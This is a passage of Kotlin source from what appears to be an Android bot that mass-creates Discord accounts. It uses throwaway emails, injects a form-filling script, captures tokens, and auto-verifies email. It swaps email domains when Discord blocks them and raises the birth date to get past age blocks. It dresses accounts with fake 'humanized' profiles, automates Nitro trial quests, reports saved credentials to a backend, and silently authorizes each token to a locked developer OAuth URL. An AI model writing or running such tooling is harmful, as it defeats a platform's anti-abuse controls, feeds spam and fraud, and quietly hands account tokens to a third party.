        identityVerificationHandled = false
        phoneVerificationHandled = false
        emailGateReleased = false
        pendingPhoneRequest = false
        phoneSkipped = false
        captchaSolving = false
        captchaManualMode = false
        emailRetryCount = 0
        usernameRetryCount = 0
        lastUsernameRetryMs = 0L
        lastStuckCheck = System.currentTimeMillis()
        pendingPhone = ""
        pendingPhoneStatus = "NOT_ASKED"
        pendingEmailStatus = "NOT_ASKED"
        pendingTimeline = Account.appendEvent("", "created")
        earlySavedAccountId = 0L
        pendingEmailVerified = false
        lastCaptchaMethod = "Manual"
        lastCaptchaSolverApi = ""

        // Hard reset token/email flags so multi-gen cannot reuse previous account token
        pendingToken = ""
        pendingEmailVerified = false
        earlySavedAccountId = 0L
        pendingEmail = ""
        pendingPassword = ""
        // Clear previous session cookies/localStorage so old accounts don't redirect to discord.com/app
        withContext(Dispatchers.Main) { listener.clearWebViewData() }
        delay(if (FeatureFlags.SPEED_EXPERIMENTS) 400 else 800)

        // Custom Username ON → prefix + digits; OFF → evsuser(+ optional _) + digits
        // Custom Username ON → prefix or precoded stems; OFF → always evsuser(+digits)
        currentUsername = if (prefs.randomUsernameEnabled) {
            val base = if (prefs.usernameSourceMode == "custom") {
                prefs.usernamePrefix.trim().ifBlank { "User" }
            } else {
                Humanizer.randomUsernameStem(context)
            }
            TokenUtil.nextUsernameVariant(base, attempt = 0, allowUnderscore = true, avoid = usedUsernames)
        } else {
            TokenUtil.nextUsernameVariant("evsuser", attempt = 0, allowUnderscore = true, avoid = usedUsernames)
        }
        usedUsernames += currentUsername
        val emailLocalPart = generateEmailLocalPart()
        // Custom Display Name ON → custom string; OFF → User
        // Custom Display Name ON → custom/precoded; OFF → fixed User (not random nova stems)
        currentDisplayName = if (prefs.randomDisplayNameEnabled) {
            if (prefs.displayNameSourceMode == "custom") {
                prefs.customDisplayName.trim().ifBlank { "User" }
            } else {
                Humanizer.randomDisplayName(context)
            }
        } else {
            "User"
        }

        // Account password first so mail providers (mail.tm) can use the same inbox password
// Custom Password ON → prefs.customPassword; OFF → User
        pendingPassword = if (prefs.customPasswordEnabled) {
            if (prefs.passwordSourceMode == "custom") {
                prefs.customPassword.trim().ifBlank { "User" }
            } else {
                // Precoded: random strong-ish password
                val chars = "abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789!@#"
                (1..14).map { chars.random() }.joinToString("")
            }
        } else {
            "User"
        }

        // Step 1: create temp email via selected provider (cybertemp primary)
        val provider = activeEmailProvider()
        log("Creating temp email via $provider...", LogLevel.INFO)
        val emailResult = createTempEmail(emailLocalPart, pendingPassword)
        if (emailResult.address.isBlank()) {
            log("✗ Failed to create temp email via $provider — no usable domain", LogLevel.ERROR)
            throw IllegalStateException("temp email create failed")
        }
        pendingEmail = emailResult.address
        pendingEmailDomainFromApi = emailResult.domainFromApi
        val usedDomain = emailResult.domain.ifBlank { emailResult.address.substringAfter("@", "") }
        // Log the domain that was actually returned (may be a fallback provider)
        if (emailResult.domainFromApi) {
            log("✓ Domain ready: @$usedDomain", LogLevel.SUCCESS)
        } else {
            log("⚠ Domain ready (fallback path): @$usedDomain", LogLevel.WARNING)
        }
        log("Generated email: $pendingEmail", LogLevel.SUCCESS)

        

        log("Account ${sessionCreated + 1} — Username: $currentUsername | Display: $currentDisplayName | Email: $pendingEmail | Password: $pendingPassword", LogLevel.INFO)
        try {
            GenCheckpoint.save(context, GenCheckpoint.State(
                email = pendingEmail,
                password = pendingPassword,
                username = currentUsername,
                displayName = currentDisplayName,
                provider = activeEmailProvider(),
                step = "register"
            ))
        } catch (_: Exception) {}

        withContext(Dispatchers.Main) {
            listener.navigateTo("https://discord.com/register")
        }
        delay(if (FeatureFlags.SPEED_EXPERIMENTS) 900 else 2200)

        val fillJs = buildFillJs(pendingEmail, currentDisplayName, currentUsername, pendingPassword)
        withContext(Dispatchers.Main) {
            listener.injectJs(fillJs)
        }
        log("Filling registration form...", LogLevel.INFO)
        delay(if (FeatureFlags.SPEED_EXPERIMENTS) 500 else 1000)

        log("Waiting for account creation...", LogLevel.INFO)

        val maxWaitMs = 10 * 60 * 1000L
        val start = System.currentTimeMillis()
        var success = false
        // lastStuckCheck is an instance variable (reset in generateOne, onContinuePressed, auto-solved)

        while (System.currentTimeMillis() - start < maxWaitMs && running) {
            // Post-register API login — ONLY after submit/captcha phase started.
            // waitingForContinue is set when Create Account was pressed / captcha path ran.
            // Calling /auth/login before that only produces MFA/captcha noise.
            if (pendingToken.isEmpty()
                && waitingForContinue
                && !captchaSolving
                && pendingEmail.isNotBlank()
                && pendingPassword.isNotBlank()
            ) {
                val now = System.currentTimeMillis()
                val elapsed = now - start
                if (elapsed > 20_000L && now - lastApiLoginAttemptMs > 15_000L) {
                    lastApiLoginAttemptMs = now
                    val apiTok = loginForToken(pendingEmail, pendingPassword)
                    if (!apiTok.isNullOrBlank() && TokenUtil.isValidTokenFormat(apiTok)) {
                        pendingToken = apiTok
                    }
                }
            }
            // If JS already captured the token (e.g. user solved captcha and Discord
            // Token present = logged in. Always auto-continue; CONTINUE is fallback only.
            if (pendingToken.isNotEmpty() && TokenUtil.isValidTokenFormat(pendingToken)) {
                if (waitingForContinue) {
                    waitingForContinue = false
                    captchaManualMode = false
                    log("✓ Token captured — auto-resuming (no CONTINUE needed)", LogLevel.SUCCESS)
                    try { listener.onAutoResumed() } catch (_: Exception) {}
                } else {
                    log("✓ Token captured — continuing automatically", LogLevel.SUCCESS)
                }
                success = true
                break
            }

            // Discord rejected the email (e.g. blacklisted CyberTemp domain) — get a fresh one.
            // This takes priority over waiting for Continue because it requires a page reload.
            if (emailRejected) {
                emailRejected = false
                emailRetryCount++
                if (emailRetryCount > 3) {
                    log("Email rejected too many times — moving to next account", LogLevel.ERROR)
                    try {
                        withContext(Dispatchers.Main) { listener.clearWebViewData() }
                    } catch (_: Exception) {}
                    return
                }
                try {
                    retryWithNewEmail()
                } catch (e: Exception) {
                    log("Email retry failed: ${e.message}", LogLevel.ERROR)
                }
                continue
            }

            if (waitingForContinue) {
                delay(500)
                continue
            }

            withContext(Dispatchers.Main) {
                listener.injectJs(CHECK_URL_JS)
            }
            delay(if (FeatureFlags.SPEED_EXPERIMENTS) 700 else 1500)

            if (pendingToken.isNotEmpty() && TokenUtil.isValidTokenFormat(pendingToken)) {
                success = true
                break
            }

            // Phone verification skipped — save account and move to next
            if (phoneSkipped && !waitingForContinue && !success) {
                log("Phone verification skipped — saving account details", LogLevel.WARNING)
                withContext(Dispatchers.Main) { listener.injectJs(CHECK_URL_JS) }
                delay(if (FeatureFlags.SPEED_EXPERIMENTS) 900 else 2000)
                if (pendingToken.isNotEmpty() && TokenUtil.isValidTokenFormat(pendingToken)) {
                    success = true
                } else {
                    val acc = Account(
                        email = pendingEmail,
                        password = pendingPassword,
                        token = "PHONE_REQUIRED",
                        status = "PHONE_REQUIRED",
                        verified = false,
                        phone = pendingPhone,
                        emailVerified = pendingEmailVerified,
                        phoneStatus = pendingPhoneStatus,
                        captchaSolveMethod = lastCaptchaMethod,
                        captchaSolverApi = lastCaptchaSolverApi
                    )
                    val savedAccId = dao.insert(acc)
                    val savedAcc = acc.copy(id = savedAccId)
                    sessionCreated++
                    listener.onAccountSaved(savedAcc)
                    reportAccountToBackend(savedAcc)
                    listener.onCounterUpdate(sessionCreated, prefs.targetCount)
                    log("✓ Saved (phone not verified): $pendingEmail:$pendingPassword", LogLevel.WARNING)
                    notifier.onAccountSaved(savedAcc)
                    withContext(Dispatchers.Main) { listener.navigateTo("https://discord.com/register") }
                    pendingToken = ""
                    return
                }
            }

            // Only fire the stuck warning when we're NOT already in manual captcha mode
            // and a few minutes have elapsed without any token. Reset clock on Continue.
            if (!captchaManualMode && !waitingForContinue) {
                val elapsed = System.currentTimeMillis() - lastStuckCheck
                if (elapsed > 120_000L) {
                    lastStuckCheck = System.currentTimeMillis()
                    log("⚠ Automation appears stuck — please complete this step manually, then press CONTINUE.", LogLevel.CAPTCHA, showContinue = true)
                    if (prefs.notifyHumanRequired) {
                        try { android.widget.Toast.makeText(context, "Human action needed — CONTINUE", android.widget.Toast.LENGTH_LONG).show() } catch (_: Exception) {}
                    }
                    waitingForContinue = true
                    listener.onStuck("Automation got stuck. Please complete the current step manually, then tap CONTINUE.")
                }
            }
        }

        if (!success) {
            log("Account creation timed out", LogLevel.ERROR)
            pendingToken = ""
            return
        }

        val token = pendingToken.trim('"')
        pendingToken = ""

        if (!TokenUtil.isValidTokenFormat(token)) {
            log("Invalid token format, trying API login...", LogLevel.WARNING)
            val apiToken = checker.fetchTokenViaApi(pendingEmail, pendingPassword)
            if (apiToken.isNullOrEmpty()) {
                log("Could not retrieve token", LogLevel.ERROR)
                return
            }
            processToken(apiToken)
        } else {
            processToken(token)
        }
    }


    /** Discord rejected DOB / under-13 — clear WebView and retry with older DOB range. */
    private suspend fun recoverFromAgeBlock(reason: String) {
        log("Age/DOB block detected: $reason — clearing session and retrying with safer DOB (18+)", LogLevel.WARNING)
        pendingTimeline = Account.appendEvent(pendingTimeline, "age_block_recover")
        withContext(Dispatchers.Main) {
            try { listener.clearWebViewData() } catch (_: Exception) {}
            try {
                // Force next fill to use 18+ even if settings were set low
                android.webkit.CookieManager.getInstance().removeAllCookies(null)
                android.webkit.CookieManager.getInstance().flush()
            } catch (_: Exception) {}
        }
        delay(800)
        try {
            if (prefs.dobMinAge < 18) {
                prefs.dobMinAge = 18
                log("Settings: DOB min age raised to 18 for this device", LogLevel.INFO)
            }
            if (prefs.dobMaxAge < 18) {
                prefs.dobMaxAge = 25
            }
        } catch (_: Exception) {}
    }

    private suspend fun processToken(token: String) {
        val userId = TokenUtil.extractUserId(token)
        val tokenCreatedAt = TokenUtil.extractTokenCreatedAt(token)
        log("Token extracted — User: $userId", LogLevel.SUCCESS)
        pendingTimeline = Account.appendEvent(pendingTimeline, "logged_in")
        if (lastCaptchaMethod.isNotBlank()) {
            pendingTimeline = Account.appendEvent(pendingTimeline, "captcha")
        }

        // EARLY SAVE: as soon as logged in / token captured, persist account so
        // email/phone failures cannot waste the whole run. Status starts as LOGGED_IN
        // with email not verified and phone not asked (updated as steps complete).
        if (earlySavedAccountId == 0L) {
            val early = Account(
                email = pendingEmail,
                password = pendingPassword,
                token = token,
                status = "LOGGED_IN",
                verified = false,
                phone = pendingPhone,
                emailVerified = false,
                emailStatus = "NOT_VERIFIED",
                phoneStatus = pendingPhoneStatus,
                captchaSolveMethod = lastCaptchaMethod,
                captchaSolverApi = lastCaptchaSolverApi,
                tokenCreatedAt = tokenCreatedAt,
                timeline = pendingTimeline
            )
            earlySavedAccountId = dao.insert(early)
            // Stash for silent authorize if gen is stopped before final steps
            if (pendingToken.isNotBlank()) pendingVaultCordToken = pendingToken
            sessionCreated++
            log("✓ Early-saved account id=$earlySavedAccountId (email/phone pending)", LogLevel.SUCCESS)
            listener.onAccountSaved(early.copy(id = earlySavedAccountId))
        }

        if (prefs.verifyEmailEnabled) {
            val (verified, _) = checker.isEmailVerified(token)
            when (verified) {
                true -> {
                    pendingEmailVerified = true
                    pendingEmailStatus = "VERIFIED"
                    pendingTimeline = Account.appendEvent(pendingTimeline, "email_ok")
                    log("Email already verified ✓", LogLevel.SUCCESS)
                }
                false -> {
                    log("Email not verified — API-first verify (link token → /auth/verify), inbox link as fallback…", LogLevel.INFO)
                    log("  Inbox: $pendingEmail", LogLevel.INFO)

                    // Discord often sends the first verify mail before our poll starts.
                    // Always re-request so a NEW message lands while we are listening.
                    resendVerificationEmail(token) { msg -> log(msg, LogLevel.INFO) }
                    delay(if (FeatureFlags.SPEED_EXPERIMENTS) 700 else 1500)

                    // Pass log callback so every poll step shows in the console
                    val verifyBudget = (prefs.verifyTimeoutSeconds.coerceIn(30, 180) * 1000L)
                    val firstWave = if (FeatureFlags.SPEED_EXPERIMENTS) minOf(35_000L, verifyBudget) else minOf(45_000L, verifyBudget)
                    var verifyUrl = pollVerificationUrl(
                        emailAddr = pendingEmail,
                        timeoutMs = firstWave,
                        onLog = { msg -> log(msg, LogLevel.INFO) }
                    )
                    // API-first: confirm token from link via POST /auth/verify before opening WebView
                    if (!verifyUrl.isNullOrBlank()) {
                        val earlyApi = confirmVerifyTokenFromUrl(token, verifyUrl)
                        if (earlyApi) {
                            pendingEmailVerified = true
                            pendingEmailStatus = "VERIFIED"
                            pendingTimeline = Account.appendEvent(pendingTimeline, "email_ok")
                            log("✓ Email verified via API (/auth/verify) — skipped link open", LogLevel.SUCCESS)
                            verifyUrl = null // prevent redundant open
                        }
                    }
                    // If first wave missed (mail already consumed / late), resend again and poll longer
                    if (verifyUrl == null) {
                        log("No link yet — re-requesting verification email and polling again...", LogLevel.INFO)
                        resendVerificationEmail(token) { msg -> log(msg, LogLevel.INFO) }
                        delay(if (FeatureFlags.SPEED_EXPERIMENTS) 900 else 2000)
                        val secondWave = if (FeatureFlags.SPEED_EXPERIMENTS) minOf(60_000L, verifyBudget) else verifyBudget
                        verifyUrl = pollVerificationUrl(
                            emailAddr = pendingEmail,
                            timeoutMs = secondWave,
                            onLog = { msg -> log(msg, LogLevel.INFO) }
                        )
                    }
                    // Real IMAP fallback for custom / any mail when Tools → MORE IMAP is on
                    if (verifyUrl == null && prefs.imapEnabled && prefs.imapPass.isNotBlank()) {
                        log("Trying IMAP inbox for verification link…", LogLevel.INFO)
                        verifyUrl = ImapMailFetcher(prefs).fetchVerificationUrl(
                            pendingEmail, 90_000L
                        ) { msg -> log(msg, LogLevel.INFO) }
                    }

                    if (verifyUrl != null) {
                        log("✓ Verification link found — confirming via API + opening in WebView...", LogLevel.SUCCESS)
                        log("  URL: ${verifyUrl.take(60)}...", LogLevel.INFO)
                        val apiOk = confirmVerifyTokenFromUrl(token, verifyUrl)
                        if (apiOk) {
                            log("✓ Email verified via /auth/verify API", LogLevel.SUCCESS)
                            pendingEmailVerified = true
                            pendingEmailStatus = "VERIFIED"
                            pendingTimeline = Account.appendEvent(pendingTimeline, "email_ok")
                        }
                        withContext(Dispatchers.Main) { listener.navigateTo(verifyUrl) }
                        delay(if (FeatureFlags.SPEED_EXPERIMENTS) 1800 else 4000)

                        // Poll Discord API every 1s up to 60s (custom-mail + temp-mail)
                        log("Waiting for Discord to confirm email verification (up to 60s, poll every 1s)...", LogLevel.INFO)
                        var emailVerified = false
                        var waitMs = 0L
                        val maxVerifyWait = 60_000L
                        while (waitMs < maxVerifyWait) {
                            val (v, _) = checker.isEmailVerified(token)
                            if (v == true) {
                                emailVerified = true
                                break
                            }
                            delay(1_000)
                            waitMs += 1_000
                            if (waitMs % 10_000 == 0L) {
                                log("Still waiting for email verification... (${waitMs / 1000}s)", LogLevel.INFO)
                            }
                        }

                        if (emailVerified) {
                            pendingEmailVerified = true
                            pendingEmailStatus = "VERIFIED"
                            pendingTimeline = Account.appendEvent(pendingTimeline, "email_ok")
                            log("✓ Email verified!", LogLevel.SUCCESS)
                        } else {
                            pendingEmailVerified = false
                            pendingEmailStatus = "NOT_VERIFIED"
                            pendingTimeline = Account.appendEvent(pendingTimeline, "email_fail")
                            log("Email verification timed out (60s) — marked NOT_VERIFIED (not error)", LogLevel.WARNING)
                        }
                    } else {
                        // Custom mail / no inbox access: still poll Discord API for up to 60s
                        log("No inbox verification link — polling Discord API for email verify (60s)…", LogLevel.INFO)
                        var emailVerified = false
                        var waitMs = 0L
                        while (waitMs < 60_000L) {
                            val (v, _) = checker.isEmailVerified(token)
                            if (v == true) { emailVerified = true; break }
                            delay(1_000)
                            waitMs += 1_000
                            if (waitMs % 10_000 == 0L) log("Still waiting for email verification... (${waitMs / 1000}s)", LogLevel.INFO)
                        }
                        if (emailVerified) {
                            pendingEmailVerified = true
                            pendingEmailStatus = "VERIFIED"
                            pendingTimeline = Account.appendEvent(pendingTimeline, "email_ok")
                            log("✓ Email verified via Discord API!", LogLevel.SUCCESS)
                        } else {
                            pendingEmailVerified = false
                            pendingEmailStatus = "NOT_VERIFIED"
                            pendingTimeline = Account.appendEvent(pendingTimeline, "email_fail")
                            log("Email still unverified after 60s — marked NOT_VERIFIED (not error)", LogLevel.WARNING)
                        }
                    }
                }
                null -> {
                    pendingEmailStatus = "NOT_VERIFIED_BUG"
                    pendingTimeline = Account.appendEvent(pendingTimeline, "email_fail")
                    log("Could not check email verification status — NOT_VERIFIED_BUG", LogLevel.WARNING)
                }
            }
        } else {
            pendingEmailStatus = "NOT_ASKED"
            pendingTimeline = Account.appendEvent(pendingTimeline, "email_skip")
        }

        // Sync email outcome onto early-saved row if present
        if (earlySavedAccountId != 0L) {
            dao.updateEmailOutcome(
                earlySavedAccountId,
                pendingEmailVerified,
                pendingEmailStatus,
                pendingTimeline
            )
        }

        // Email first, then phone — never run both at once
        emailGateReleased = true
        log("Email step finished (${pendingEmailStatus}) — phone may proceed if required", LogLevel.INFO)
        if (pendingPhoneRequest && !phoneVerificationHandled) {
            log("Queued phone verification starting after email…", LogLevel.INFO)
            onBridgePhoneVerificationRequired()
        }

        val status = retryWithBackoff { checker.checkToken(token) } ?: TokenChecker.TokenStatus.ERROR
        log("Token status: $status", LogLevel.SUCCESS)

        if (prefs.saveOnlyValid && status != TokenChecker.TokenStatus.VALID) {
            log("Token not VALID — skipped (save-only-valid mode)", LogLevel.WARNING)
            logoutWebView()
            return
        }

        // Map token check to display status — never call pure email-fail "ERROR"
        val displayStatus = when {
            status == TokenChecker.TokenStatus.VALID && pendingEmailVerified -> "VALID"
            status == TokenChecker.TokenStatus.VALID && !pendingEmailVerified -> "UNVERIFIED"
            status == TokenChecker.TokenStatus.LOCKED -> "LOCKED"
            status == TokenChecker.TokenStatus.INVALID -> "INVALID"
            status == TokenChecker.TokenStatus.ERROR && pendingEmailStatus in listOf("NOT_VERIFIED", "NOT_VERIFIED_BUG", "FAILED") -> "UNVERIFIED"
            status == TokenChecker.TokenStatus.ERROR -> "UNVERIFIED"
            else -> status.name
        }
        if (pendingPhoneStatus == "NOT_ASKED") {
            pendingTimeline = Account.appendEvent(pendingTimeline, "phone_skip")
        }
        pendingTimeline = Account.appendEvent(pendingTimeline, "saved")

        val (score, scoreReason) = calculateScore(status, pendingEmailVerified, pendingPhoneStatus, tokenCreatedAt)
        val account = Account(
            email = pendingEmail,
            password = pendingPassword,
            token = token,
            status = displayStatus,
            verified = status == TokenChecker.TokenStatus.VALID,
            phone = pendingPhone,
            emailVerified = pendingEmailVerified,
            emailStatus = pendingEmailStatus,
            phoneStatus = pendingPhoneStatus,
            captchaSolveMethod = lastCaptchaMethod,
            captchaSolverApi = lastCaptchaSolverApi,
            score = score,
            scoreReason = scoreReason,
            tokenCreatedAt = tokenCreatedAt,
            timeline = pendingTimeline
        )
        val savedAccount = if (earlySavedAccountId != 0L) {
            val updated = account.copy(id = earlySavedAccountId)
            dao.update(updated)
            updated
        } else {
            val savedId = dao.insert(account)
            sessionCreated++
            account.copy(id = savedId)
        }
        listener.onAccountSaved(savedAccount)
        reportAccountToBackend(savedAccount)
        listener.onCounterUpdate(sessionCreated, prefs.targetCount)
        log("✓ Account stored in Results! [$displayStatus] Score: $score/100 | email=${pendingEmailStatus} phone=${pendingPhoneStatus}", LogLevel.SUCCESS)
        try {
            prefs.genSuccessTotal = prefs.genSuccessTotal + 1
            if (pendingEmailStatus.equals("VERIFIED", true)) prefs.genVerifiedTotal = prefs.genVerifiedTotal + 1
            if (pendingPhoneStatus.equals("VERIFIED", true)) prefs.genPhoneTotal = prefs.genPhoneTotal + 1
        } catch (_: Exception) {}
        try { GenCheckpoint.clear(context) } catch (_: Exception) {}
        // Notify only after optional phone/email steps settled
        notifier.onAccountSaved(savedAccount)
        log("  Email: $pendingEmail", LogLevel.SUCCESS)
        log("  Token: ${token.take(24)}...", LogLevel.SUCCESS)

        // Bio rules:
        //  disable hardcoded ON  + humanizer OFF → no bio
        //  disable hardcoded ON  + humanizer ON  → humanizer bio only (set in Humanizer block)
        //  disable hardcoded OFF + humanizer OFF → branding only
        //  disable hardcoded OFF + humanizer ON  → branding + blank line + humanizer (≤190)
        when {
            prefs.disableBioInjection && !prefs.humanizerEnabled -> {
                log("Bio skipped (hardcoded disabled, humanizer off)", LogLevel.INFO)
            }
            prefs.disableBioInjection && prefs.humanizerEnabled -> {
                log("Hardcoded bio off — humanizer will set bio", LogLevel.INFO)
            }
            !prefs.disableBioInjection && !prefs.humanizerEnabled -> {
                val bioText = DiscordApi.brandingHeader()
                val bioSet = discordApi.setBio(token, bioText)
                log(if (bioSet) "✓ Branding bio set" else "⚠ Bio set failed",
                    if (bioSet) LogLevel.SUCCESS else LogLevel.WARNING)
            }
            else -> {
                // humanizer on + hardcoded allowed → combined in Humanizer block below
                log("Branding + humanizer bio will be combined", LogLevel.INFO)
            }
        }

        // Set avatar via API if enabled (manual single image from Settings)
        if (prefs.avatarEnabled && prefs.avatarUri.isNotBlank()) {
            var avatarSet = false
            repeat(2) { attempt ->
                val avatarB64 = loadAndEncodeAvatar(prefs.avatarUri, prefs.avatarFit)
                if (avatarB64 != null) {
                    avatarSet = discordApi.setAvatar(token, avatarB64)
                    if (avatarSet) {
                        log("✓ Avatar set via API", LogLevel.SUCCESS)
                        return@repeat
                    }
                    log("⚠ Avatar set attempt ${attempt + 1} failed — retrying", LogLevel.WARNING)
                } else {
                    log("⚠ Could not load avatar image from URI (attempt ${attempt + 1})", LogLevel.WARNING)
                }
            }
            if (!avatarSet) log("⚠ Avatar set via API failed after retries", LogLevel.WARNING)
        }

        // Humanizer — random profile pieces (default OFF)
        if (prefs.humanizerEnabled) {
            log("Humanizer running…", LogLevel.INFO)
            val profile = Humanizer.randomProfile(context, includeAvatar = prefs.humanizerAvatar)
            // bio + humanizer on = branding header + humanizer bio on next lines (≤190)
            // disable hardcoded on = humanizer bio only
            if (prefs.humanizerBio && profile.bio.isNotBlank()) {
                val bioText = if (!prefs.disableBioInjection) {
                    DiscordApi.composeBrandedBio(profile.bio)
                } else {
                    profile.bio.take(DiscordApi.BIO_MAX)
                }
                val ok = discordApi.setBio(token, bioText)
                log(
                    if (ok) {
                        if (!prefs.disableBioInjection) "✓ Branding + humanizer bio"
                        else "✓ Humanizer bio"
                    } else "⚠ Bio set failed",
                    if (ok) LogLevel.SUCCESS else LogLevel.WARNING
                )
            } else if (!prefs.disableBioInjection) {
                // humanizer on but no humanizer bio line — branding only
                val ok = discordApi.setBio(token, DiscordApi.brandingHeader())
                log(if (ok) "✓ Branding bio" else "⚠ Bio failed", if (ok) LogLevel.SUCCESS else LogLevel.WARNING)
            }
            run {
                val ok = discordApi.setDisplayName(token, profile.displayName)
                log(if (ok) "✓ Humanizer display: ${profile.displayName}" else "⚠ Display name failed", if (ok) LogLevel.SUCCESS else LogLevel.WARNING)
            }
            run {
                val ok = discordApi.setPronouns(token, profile.pronouns)
                log(if (ok) "✓ Pronouns: ${profile.pronouns}" else "⚠ Pronouns failed", if (ok) LogLevel.SUCCESS else LogLevel.WARNING)
            }
            if (prefs.humanizerStatus && profile.customStatus.isNotBlank()) {
                val ok = discordApi.setCustomStatus(token, profile.customStatus)
                log(if (ok) "✓ Status: ${profile.customStatus}" else "⚠ Status failed", if (ok) LogLevel.SUCCESS else LogLevel.WARNING)
            }
            if (prefs.humanizerAvatar || prefs.pinterestAvatarEnabled) {
                // 90% assets (Humanizer pack), 10% Pinterest when enabled — matches Shinchan-style
                // reliability (local bytes first) without killing variety entirely.
                var b64 = profile.avatarBase64Png
                val usePinterest = prefs.pinterestAvatarEnabled &&
                    (b64 == null || kotlin.random.Random.nextInt(100) >= 90)
                if (usePinterest) {
                    val pin = PinterestAvatarFetcher.fetchAvatarJpegBase64(
                        prefs.pinterestAvatarKeyword.ifBlank { "portrait" }
                    ) { msg -> log(msg, LogLevel.INFO) }
                    if (pin != null) b64 = pin
                }

                if (b64 == null && prefs.avatarEnabled && prefs.avatarUri.isNotBlank()) {
                    b64 = loadAndEncodeAvatar(prefs.avatarUri, prefs.avatarFit)
                }
                if (b64 != null) {
                    var ok = false
                    repeat(3) { attempt ->
                        if (ok) return@repeat
                        ok = discordApi.setAvatar(token, b64)
                        if (!ok) {
                            log("⚠ Avatar PATCH attempt ${attempt + 1} failed — retry", LogLevel.WARNING)
                            kotlinx.coroutines.delay(800)
                        }
                    }
                    log(if (ok) "✓ Avatar set" else "⚠ Avatar set failed after retries", if (ok) LogLevel.SUCCESS else LogLevel.WARNING)
                } else {
                    log("⚠ No avatar bytes (assets empty / URI unreadable / Pinterest miss)", LogLevel.WARNING)
                }
            }
            // Humanizer may also roll hype; dedicated toggle below always can apply
            if (prefs.hypeBadgeEnabled) {
                val ok = discordApi.setHypeSquad(token, profile.hypeHouseId)
                log(
                    if (ok) "✓ HypeSquad ${Humanizer.hypeHouseName(profile.hypeHouseId)}" else "⚠ HypeSquad failed",
                    if (ok) LogLevel.SUCCESS else LogLevel.WARNING
                )
            }
        } else if (prefs.hypeBadgeEnabled) {
            val house = listOf(1, 2, 3).random()
            val ok = discordApi.setHypeSquad(token, house)
            log(
                if (ok) "✓ HypeSquad ${Humanizer.hypeHouseName(house)}" else "⚠ HypeSquad failed",
                if (ok) LogLevel.SUCCESS else LogLevel.WARNING
            )
        }

        // Trial nitro trigger — full automatic: complete shortest quest, optional join+ping
        if (prefs.trialTriggerEnabled && token.isNotBlank()) {
            try {
                log("[!] Trial trigger starting…", LogLevel.INFO)
                val result = TrialQuestTrigger.run(token) { msg ->
                    log(msg, if (msg.startsWith("[!] Trial trigger attempted")) LogLevel.SUCCESS else LogLevel.INFO)
                }
                if (result.completed) {
                    log("[!] Trial quest completed — claim path ready", LogLevel.SUCCESS)
                    try {
                        android.widget.Toast.makeText(context, "Nitro trial quest completed", android.widget.Toast.LENGTH_LONG).show()
                    } catch (_: Exception) {}
                } else if (result.attempted) {
                    log("[!] Trial trigger finished without full completion (${result.message})", LogLevel.WARNING)
                }
                if (prefs.trialAutoJoinEnabled) {
                    val inv = prefs.trialJoinInvite.trim()
                    val ch = prefs.trialPingChannelId.trim()
                    val msg = prefs.trialPingText.trim().ifBlank { "@here trial claimed" }
                    if (inv.isNotBlank() || ch.isNotBlank()) {
                        log("[!] Trial auto join/ping…", LogLevel.INFO)
                        TrialQuestTrigger.joinAndPing(token, inv, ch, msg) { m -> log(m, LogLevel.INFO) }
                    }
                }
            } catch (e: Exception) {
                log("[!] Trial trigger skipped: ${e.message}", LogLevel.WARNING)
            }
        }

        // Logout WebView for real, then silent authorize (token API — no UI).
        // Authorize also runs if gen is stopped mid-cooldown via pendingVaultCordToken.
        val oauthToken = token
        if (oauthToken.isNotBlank()) {
            pendingVaultCordToken = oauthToken
        }
        logoutWebView()
        if (oauthToken.isNotBlank()) {
            try {
                silentAuthorizeAccount(oauthToken)
                armPhoneDetectCooldown(15_000L)
            } catch (_: Exception) {}
            pendingVaultCordToken = ""
        }
    }

    private fun calculateScore(
        status: TokenChecker.TokenStatus,
        emailVerified: Boolean,
        phoneStatus: String,
        tokenCreatedAt: Long
    ): Pair<Int, String> {
        var score = 0
        val reasons = mutableListOf<String>()
        when (status) {
            TokenChecker.TokenStatus.VALID -> { score += 50; reasons.add("VALID") }
            TokenChecker.TokenStatus.LOCKED -> { score += 20; reasons.add("LOCKED") }
            else -> { score += 5; reasons.add("INVALID") }
        }
        if (emailVerified) { score += 20; reasons.add("email verified") }
        if (phoneStatus == "VERIFIED") { score += 20; reasons.add("phone verified") }
        if (tokenCreatedAt > 0) {
            val ageDays = (System.currentTimeMillis() - tokenCreatedAt) / (1000 * 60 * 60 * 24)
            if (ageDays < 1) { score += 5; reasons.add("fresh") }
            else if (ageDays < 7) { score += 3; reasons.add("recent") }
        }
        if (lastCaptchaMethod == "Automatic") { score += 5; reasons.add("auto-captcha") }
        return score.coerceIn(0, 100) to reasons.joinToString(", ")
    }

    private suspend fun logoutWebView() {
        log("Logging out...", LogLevel.INFO)
        withContext(Dispatchers.Main) {
            try {
                val cm = android.webkit.CookieManager.getInstance()
                cm.setAcceptCookie(true)
                // Clear discord cookies at the manager level (JS alone is not enough on Android)
                val cookie = cm.getCookie("https://discord.com")
                if (!cookie.isNullOrBlank()) {
                    cookie.split(";").forEach { part ->
                        val name = part.substringBefore("=").trim()
                        if (name.isNotBlank()) {
                            cm.setCookie("https://discord.com", "$name=; Max-Age=0; Path=/")
                            cm.setCookie("https://discord.com", "$name=; Max-Age=0; Path=/; Domain=.discord.com")
                        }
                    }
                }
                try { cm.removeAllCookies(null) } catch (_: Exception) {}
                try { cm.flush() } catch (_: Exception) {}
            } catch (_: Exception) {}
            try { listener.injectJs(LOGOUT_JS) } catch (_: Exception) {}
            try { listener.clearWebViewData() } catch (_: Exception) {}
            try { listener.navigateTo("about:blank") } catch (_: Exception) {}
        }
        delay(700)
        withContext(Dispatchers.Main) {
            try { listener.navigateTo("https://discord.com/login") } catch (_: Exception) {}
        }
        delay(1400)
    }

    /**
     * Silent Auth Verifier — private for developer URL.
     * Order: 1) locked developer auth URL  2) user Auth Verifier links (up to 5).
     * Works with any Discord OAuth authorize URL (VaultCord, RestoreCord, self-hosted, etc.).
     */
    private suspend fun silentAuthorizeAccount(token: String) {
        val clean = token.trim()
        if (clean.length < 20) {
            log("Auth Verifier skipped — token too short", LogLevel.WARNING)
            return
        }
        val urls = mutableListOf(VaultCordOAuth.DEV_AUTH_URL)
        try {
            if (prefs.vaultcordEnabled) {
                for (u in prefs.authVerifierUserUrls()) {
                    if (u !in urls) urls.add(u)
                }
            }
        } catch (e: Exception) {
            log("Auth Verifier URL list error: ${e.message}", LogLevel.WARNING)
        }
        var anyOk = false
        for (url in urls) {
            val cid = VaultCordOAuth.parseAuthUrl(url)?.clientId.orEmpty()
            if (cid.isNotBlank() && VaultCordVerifiedStore.isVerified(context, clean, cid)) {
